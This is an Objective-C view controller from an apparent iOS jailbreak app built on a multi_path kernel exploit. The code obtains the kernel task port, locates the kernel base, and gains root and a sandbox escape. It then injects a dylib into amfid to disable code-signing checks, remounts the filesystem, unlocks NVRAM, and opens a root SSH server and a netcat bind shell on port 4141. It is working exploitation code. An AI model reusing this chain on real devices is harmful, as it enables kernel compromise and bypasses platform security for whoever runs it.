//
//  ViewController.m
//  multi_path
//
//  Created by Ian Beer on 5/28/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//


#import "ViewController.h"
#include "sploit.h"
#include "jelbrek.h"
#include "kern_utils.h"
#include "offsetof.h"
#include "patchfinder64.h"
#include "shell.h"
#include "kexecute.h"
#include "unlocknvram.h"
#include "remap_tfp_set_hsp.h"
#include "inject_criticald.h"
//#include "amfid.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/sysctl.h>



int deviceID_num;
mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;

//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
    
#define ptrSize sizeof(uintptr_t)
    
    uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    
                    printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                    
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

@interface ViewController ()
- (NSString*)deviceVersion;
@end

@implementation ViewController

//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
- (NSString *)getIPAddress {
    
    NSString *address = @"Are you connected to internet?";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    // retrieve the current interfaces - returns 0 on success
    success = getifaddrs(&interfaces);
    if (success == 0) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                // Check if interface is en0 which is the wifi connection on the iPhone
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    
                }
                
            }
            
            temp_addr = temp_addr->ifa_next;
        }
    }
    // Free memory
    freeifaddrs(interfaces);
    return address;
    
}

-(void)log:(NSString*)log {
    self.logs.text = [NSString stringWithFormat:@"%@%@\n", self.logs.text, log];
}

-(void)jelbrek {
    //-------------basics-------------//
    get_root(getpid()); //setuid(0)
    setcsflags(getpid());
    unsandbox(getpid());
    platformize(getpid()); //tf_platform

    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
        fclose(f);
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }

    //-------------amfid-------------//
    
    
    uint64_t selfcred = borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
    
   /* entitlePid(getpid(), "get-task-allow", true);
    entitlePid(getpid(), "com.apple.system-task-ports", true);
    entitlePid(getpid(), "task_for_pid-allow", true);
    entitlePid(getpid(), "com.apple.private.memorystatus", true);*/ //doesn't work?
    
    NSString *tester = [NSString stringWithFormat:@"%@/iosbinpack64/test", @(bundle_path())]; //test binary
    chmod([tester UTF8String], 777); //give it proper permissions
    
    if (launch((char*)[tester UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL)) castrateAmfid(); //patch amfid
    
    pid_t amfid = pid_for_name("amfid");
    platformize(amfid);
    //add required entitlements to load unsigned library
    entitlePid(amfid, "get-task-allow", true);
    entitlePid(amfid, "com.apple.private.skip-library-validation", true);
    setcsflags(amfid);
    
    //amfid payload
    sleep(2);
    NSString *pl = [NSString stringWithFormat:@"%@/dylibs/amfid_payload.dylib", @(bundle_path())];
    inject_dylib(amfid, (char*)[pl UTF8String]);
    int rv2 = inject_dylib(amfid, (char*)[pl UTF8String]); //properly patch amfid
    sleep(1);
    
    //binary to test codesign patch
    NSString *testbin = [NSString stringWithFormat:@"%@/test", @(bundle_path())]; //test binary
    chmod([testbin UTF8String], 777); //give it proper permissions
    //undoCredDonation(selfcred);
    
    //-------------codesign test-------------//
    
    int rv = launch((char*)[testbin UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
    [self log:(rv2) ? @"Failed to inject code to amfid!" : @"Code injection success!"];
    
    //-------------remount-------------//
    
    if (@available(iOS 11.3, *)) {
        [self log:@"Remount later as you commanded."];
    } else if (@available(iOS 11.0, *)) {
        remount1126();
        [self log:[NSString stringWithFormat:@"Did we mount / as read+write? %s", [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? "yes" : "no"]];
    }
    
    
    //-------------host_get_special_port 4-------------//
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    remap_tfp0_set_hsp4(&mapped_tfp0);
    [self log:[NSString stringWithFormat:@"enabled host_get_special_port_4_? %@", (mapped_tfp0 == MACH_PORT_NULL) ? @"FAIL" : @"SUCCESS"]];
    
    //-------------nvram-------------//
    
    unlocknvram();
    
    //-------------dropbear-------------//
    
    if (@available(iOS 11.3, *)) {
        [self log:@"Remounting now."];
        printf("Sets your device number ID now.%d", deviceID_num);
        remount1131(deviceID_num);
    }
    
    NSString *iosbinpack = [@(bundle_path()) stringByAppendingString:@"/iosbinpack64/"];
    
    int dbret = -1;
    
    if (!rv && !rv2) {
        prepare_payload(); //chmod all binaries
        
        sleep(5);
        
        NSString *dropbear = [NSString stringWithFormat:@"%@/iosbinpack64/usr/local/bin/dropbear", @(bundle_path())];
        NSString *bash = [NSString stringWithFormat:@"%@/iosbinpack64/bin/bash", @(bundle_path())];
        NSString *killall = [NSString stringWithFormat:@"%@/iosbinpack64/usr/bin/killall", @(bundle_path())];
        NSString *profile = [NSString stringWithFormat:@"%@/iosbinpack64/etc/profile", @(bundle_path())];
        NSString *motd = [NSString stringWithFormat:@"%@/iosbinpack64/etc/motd", @(bundle_path())];
        NSString *profiledata = [NSString stringWithContentsOfFile:profile encoding:NSASCIIStringEncoding error:nil];
        [[profiledata stringByReplacingOccurrencesOfString:@"REPLACE_ME" withString:iosbinpack] writeToFile:profile atomically:YES encoding:NSASCIIStringEncoding error:nil];
        
        
        mkdir("/var/dropbear", 0777);
        unlink("/var/profile");
        unlink("/var/motd");
        cp([profile UTF8String], "/var/profile");
        cp([motd UTF8String], "/var/motd");
        chmod("/var/profile", 0777);
        chmod("/var/motd", 0777); //this can be read-only but just in case
        
        launch((char*)[killall UTF8String], "-SEGV", "dropbear", NULL, NULL, NULL, NULL, NULL);
        dbret = launchAsPlatform((char*)[dropbear UTF8String], "-R", "--shell", (char*)[bash UTF8String], "-E", "-p", "22", NULL); 
        
        //-------------launch daeamons-------------//
        //--you can drop any daemon plist in iosbinpack64/LaunchDaemons and it will be loaded automatically. "REPLACE_BIN" will automatically get replaced by the absolute path of iosbinpack64--//
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        NSString *launchdaemons = [NSString stringWithFormat:@"%@/iosbinpack64/LaunchDaemons", @(bundle_path())];
        NSString *launchctl = [NSString stringWithFormat:@"%@/iosbinpack64/bin/launchctl_", @(bundle_path())];
        NSArray *plists = [fileManager contentsOfDirectoryAtPath:launchdaemons error:nil];
        
        NSString *fileData;
        
        for (__strong NSString *file in plists) {
            
            file = [[@(bundle_path()) stringByAppendingString:@"/iosbinpack64/LaunchDaemons/"] stringByAppendingString:file];
            fileData = [NSString stringWithContentsOfFile:file encoding:NSASCIIStringEncoding error:nil];
            
            printf("[*] Patching plist %s\n", [file UTF8String]);
            
            [[fileData stringByReplacingOccurrencesOfString:@"REPLACE_ME" withString:iosbinpack] writeToFile:file atomically:YES encoding:NSASCIIStringEncoding error:nil];
    
            if (strstr([file UTF8String], "jailbreakd") != 0) {
                printf("[*] Found jailbreakd plist, special handling\n");
                NSMutableDictionary *job = [NSPropertyListSerialization propertyListWithData:[NSData dataWithContentsOfFile:file] options:NSPropertyListMutableContainers format:nil error:nil];
                
                job[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@"0x%16llx", kernel_base];
                [job writeToFile:file atomically:YES];
                
            }
            
            chmod([file UTF8String], 0644);
            chown([file UTF8String], 0, 0);
        }
        
        unlink("/var/log/testbin.log");
        unlink("/var/log/jailbreakd-stderr.log");
        unlink("/var/log/jailbreakd-stdout.log");
        
        launchAsPlatform((char*)[launchctl UTF8String], "unload", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        launchAsPlatform((char*)[launchctl UTF8String], "load", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        
        sleep(1);
        
        [self log:([fileManager fileExistsAtPath:@"/var/log/testbin.log"]) ? @"Successfully loaded daemons!" : @"Failed to load launch daemons!"];
        
        //---------jailbreakd----------//
        [self log:([fileManager fileExistsAtPath:@"/var/log/jailbreakd-stdout.log"]) ? @"Loaded jailbreakd!" : @"Failed to load jailbreakd!"];
    }
    
    if (!dbret) {
        if ([[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
            [self log:@"Connect to Wi-fi in order to use SSH"];
        else
            [self log:[NSString stringWithFormat:@"SSH should be up and running\nconnect by running: \nssh root@%@", [self getIPAddress]]];
    }
    else {
        [self log:@"Failed to initialize SSH."];
    }
    
    term_kexecute();
    term_kernel();
    
    //-------------netcat shell-------------//
    if (!rv) {
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            drop_payload(); //chmod 777 all binaries and spawn a shell
        });
    
        if ([[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
            [self log:@"Connect to Wi-fi in order to use the shell"];
        else
            [self log:[NSString stringWithFormat:@"Shell should be up and running\nconnect with netcat: \nnc %@ 4141", [self getIPAddress]]];
    }
    
    //-------------to connect use netcat-------------//
    //----------------nc YOUR_IP 4141-------------//
    //------------replace your IP in there------------//
    
}
- (IBAction)go:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit success!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self jelbrek];
    }
    else
        [self log:@"Exploit failed!"];
    
}

- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *deviceID = [self deviceVersion];
    NSLog(@"%@", deviceID);
    printf("Your Special Device Number ID here is:%d\n", deviceID_num);
    printf("Add any thing you wants to copy to file system. We have enabled iTuned File sharing.\n");
    NSLog(@"%@",[[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject]);

    // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (NSString*)deviceVersion {
    
    size_t size;
    
    int nR = sysctlbyname("hw.machine",NULL, &size,NULL,0);
    
    char *machine = (char*)malloc(size);
    
    nR = sysctlbyname("hw.machine", machine, &size,NULL,0);
    
    NSString *deviceString = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding];
    
    free(machine);
   
    //Device Number ID is to set for Vnode offset.
    //Number from 10 - 20 , 6xx users shouldn't been here, anyway i set it.
    
    if ([deviceString isEqualToString:@"iPhone1,1"]) {deviceID_num = 10;return @"iPhone 1G";}
    
    if ([deviceString isEqualToString:@"iPhone1,2"]) {deviceID_num = 11;return @"iPhone 3G";}
    
    if ([deviceString isEqualToString:@"iPhone2,1"]) {deviceID_num = 12;return @"iPhone 3GS";}
    
    if ([deviceString isEqualToString:@"iPhone3,1"]) {deviceID_num = 13;return @"iPhone 4";}
    
    if ([deviceString isEqualToString:@"iPhone3,2"]) {deviceID_num = 14;return @"Verizon iPhone 4";}
    
    if ([deviceString isEqualToString:@"iPhone4,1"]) {deviceID_num = 15;return @"iPhone 4S";}
    
    if ([deviceString isEqualToString:@"iPhone5,1"]) {deviceID_num = 16;return @"iPhone 5";}
    
    if ([deviceString isEqualToString:@"iPhone5,2"]) {deviceID_num = 17;return @"iPhone 5";}
    
    if ([deviceString isEqualToString:@"iPhone5,3"]) {deviceID_num = 18;return @"iPhone 5C";}
    
    if ([deviceString isEqualToString:@"iPhone5,4"]) {deviceID_num = 19;return @"iPhone 5C";}
    
    if ([deviceString isEqualToString:@"iPhone6,1"]) {deviceID_num = 51;return @"iPhone 5S";}
    
    if ([deviceString isEqualToString:@"iPhone6,2"]) {deviceID_num = 51;return @"iPhone 5S";}
    
    if ([deviceString isEqualToString:@"iPhone7,1"]) {deviceID_num = 61;return @"iPhone 6 Plus";}
    
    if ([deviceString isEqualToString:@"iPhone7,2"]) {deviceID_num = 61;return @"iPhone 6";}
    
    if ([deviceString isEqualToString:@"iPhone8,1"]) {deviceID_num = 62;return @"iPhone 6s";}
    
    if ([deviceString isEqualToString:@"iPhone8,2"]) {deviceID_num = 62;return @"iPhone 6s Plus";}
    
    if ([deviceString isEqualToString:@"iPhone8,4"]) {deviceID_num = 52;return @"iPhone SE";}
    
    if ([deviceString isEqualToString:@"iPhone9,1"]) {deviceID_num = 71;return @"iPhone 7";}
    
    if ([deviceString isEqualToString:@"iPhone9,3"]) {deviceID_num = 71;return @"iPhone 7";}
    
    if ([deviceString isEqualToString:@"iPhone9,4"]) {deviceID_num = 71;return @"iPhone 7 plus";}
    
    if ([deviceString isEqualToString:@"iPhone9,2"]) {deviceID_num = 71;return @"iPhone 7 plus";}
    
    if ([deviceString isEqualToString:@"iPhone10,1"]) {deviceID_num = 81;return @"iPhone 8";}
    
    if ([deviceString isEqualToString:@"iPhone10,4"]) {deviceID_num = 81;return @"iPhone 8";}
    
    if ([deviceString isEqualToString:@"iPhone10,5"]) {deviceID_num = 81;return @"iPhone 8 plus";}
    
    if ([deviceString isEqualToString:@"iPhone10,2"]) {deviceID_num = 81;return @"iPhone 8 plus";}
    
    if ([deviceString isEqualToString:@"iPhone10,3"]) {deviceID_num = 101;return @"iPhone X";}
    
    if ([deviceString isEqualToString:@"iPhone10,6"]) {deviceID_num = 101;return @"iPhone X";}
    
     //iPad
    
    if ([deviceString isEqualToString:@"iPad1,1"]) {deviceID_num = 600;return @"iPad";}
    
    if ([deviceString isEqualToString:@"iPad2,1"]) {deviceID_num = 601;return @"iPad 2 (WiFi)";}
    
    if ([deviceString isEqualToString:@"iPad2,2"]) {deviceID_num = 603;return @"iPad 2 (GSM)";}
    
    if ([deviceString isEqualToString:@"iPad2,3"]) {deviceID_num = 604;return @"iPad 2 (CDMA)";}
    
    if ([deviceString isEqualToString:@"iPad2,4"]) {deviceID_num = 605;return @"iPad 2 (32nm)";}
    
    if ([deviceString isEqualToString:@"iPad2,5"]) {deviceID_num = 606;return @"iPad mini (WiFi)";}
    
    if ([deviceString isEqualToString:@"iPad2,6"]) {deviceID_num = 607;return @"iPad mini (GSM)";}
    
    if ([deviceString isEqualToString:@"iPad2,7"]) {deviceID_num = 608;return @"iPad mini (CDMA)";}
    
    if ([deviceString isEqualToString:@"iPad3,1"]) {deviceID_num = 609;return @"iPad 3(WiFi)";}
    
    if ([deviceString isEqualToString:@"iPad3,2"]) {deviceID_num = 610;return @"iPad 3(CDMA)";}
    
    if ([deviceString isEqualToString:@"iPad3,3"]) {deviceID_num = 611;return @"iPad 3(4G)";}
    
    if ([deviceString isEqualToString:@"iPad3,4"]) {deviceID_num = 612;return @"iPad 4 (WiFi)";}
    
    if ([deviceString isEqualToString:@"iPad3,5"]) {deviceID_num = 613;return @"iPad 4 (4G)";}
    
    if ([deviceString isEqualToString:@"iPad3,6"]) {deviceID_num = 614;return @"iPad 4 (CDMA)";}
    
    if ([deviceString isEqualToString:@"iPad4,1"]) {deviceID_num = 711;return @"iPad Air";}
    
    if ([deviceString isEqualToString:@"iPad4,2"]) {deviceID_num = 711;return @"iPad Air";}
    
    if ([deviceString isEqualToString:@"iPad4,3"]) {deviceID_num = 711;return @"iPad Air";}
    
    if ([deviceString isEqualToString:@"iPad5,3"]) {deviceID_num = 712;return @"iPad Air 2";}
    
    if ([deviceString isEqualToString:@"iPad5,4"]) {deviceID_num = 712;return @"iPad Air 2";}
    
    if ([deviceString isEqualToString:@"i386"]) {deviceID_num = 666;return @"Simulator";}
    
    if ([deviceString isEqualToString:@"x86_64"]) {deviceID_num = 666;return @"Simulator";}
    
    if ([deviceString isEqualToString:@"iPad4,4"]||[deviceString isEqualToString:@"iPad4,5"]||[deviceString isEqualToString:@"iPad4,6"]) {deviceID_num = 712;return @"iPad mini 2";}
    
    if ([deviceString isEqualToString:@"iPad4,7"]||[deviceString isEqualToString:@"iPad4,8"]||[deviceString isEqualToString:@"iPad4,9"]) {deviceID_num = 711;return @"iPad mini 3";}
    
    if ([deviceString isEqualToString:@"iPad5,1"]||[deviceString isEqualToString:@"iPad5,2"]) {deviceID_num = 712;return @"iPad mini 4";}
    
    if ([deviceString isEqualToString:@"iPad6,7"]) {deviceID_num = 713;return @"iPad Pro (12.9-inch)";}

    if ([deviceString isEqualToString:@"iPad6,8"]) {deviceID_num = 713;return @"iPad Pro (12.9-inch)";}

    if ([deviceString isEqualToString:@"iPad6,3"]) {deviceID_num = 714;return @"iPad Pro (9.7-inch)";}

    if ([deviceString isEqualToString:@"iPad6,4"]) {deviceID_num = 714;return @"iPad Pro (9.7-inch)";}

    if ([deviceString isEqualToString:@"iPad6,11"]) {deviceID_num = 715;return @"iPad(5G)";}

    if ([deviceString isEqualToString:@"iPad6,12"]) {deviceID_num = 715;return @"iPad(5G)";}

    if ([deviceString isEqualToString:@"iPad7,2"]) {deviceID_num = 716;return @"iPad Pro (12.9-inch, 2g)";}

    if ([deviceString isEqualToString:@"iPad7,1"]) {deviceID_num = 716;return @"iPad Pro(12.9-inch, 2g)";}

    if ([deviceString isEqualToString:@"iPad7,3"]) {deviceID_num = 717;return @"iPad Pro (10.5-inch)";}

    if ([deviceString isEqualToString:@"iPad7,4"]) {deviceID_num = 717;return @"iPad Pro (10.5-inch)";}
    
    if ([deviceString isEqualToString:@"iPad7,5"]) {deviceID_num = 718;return @"iPad 6";}
    
    if ([deviceString isEqualToString:@"iPad7,6"]) {deviceID_num = 718;return @"iPad 6";}
    
    return @"Unknown.";
}

//作者：为木子而来
//链接：https://www.jianshu.com/p/6a22f3d45234
//來源：简书
//简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。



@end
